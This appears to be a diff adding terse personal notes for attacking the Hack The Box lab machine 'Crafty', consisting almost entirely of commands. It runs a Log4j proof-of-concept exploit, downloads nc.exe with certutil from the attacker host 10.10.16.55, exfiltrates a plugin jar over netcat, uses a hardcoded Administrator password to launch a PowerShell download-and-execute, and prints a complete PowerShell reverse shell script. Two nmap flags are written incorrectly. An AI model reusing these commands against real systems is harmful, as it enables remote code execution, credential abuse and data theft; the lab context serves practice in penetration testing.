@@ -1,0 +1,33 @@
+#Crafty HTB Season 4
+
+#Scan port
+nmap -p- --min=rate=1000 T5 $IP
+
+#Scan all
+nmap -sV -sC -A $IP
+
+#Open TLuncher
+/bin/java -jar ../TLauncher-2.895/TLauncher-2.895.jar
+
+#Log4j
+python3 poc.py --userip 10.10.16.55 --webport 80 --lport 4444
+
+#Send nc.exe to windows
+certutil.exe -urlcache -split -f http://10.10.16.55:9000/nc.exe nc.exe
+
+#send .jar to kail
+.\nc.exe 10.10.16.55 12345 < c:\Users\svc_minecraft\server\plugins/playercounter-1.0-SNAPSHOT.jar
+
+#Revereshell to root
+$SecPass = ConvertTo-SecureString 's67u84zKq8IXw' -AsPlainText -Force
+
+$cred = New-Object System.Management.Automation.PSCredential("Administrator",$SecPass)
+
+Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.55:9000/rev.ps1')" -Credential $cred
+
+#rev.ps1
+
+$LHOST = "10.10.16.55"; $LPORT = 5555; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
+
+#link
+https://github.com/kozmer/log4j-shell-poc?tab=readme-ov-file&source=post_page-----1ad9eec96feb--------------------------------
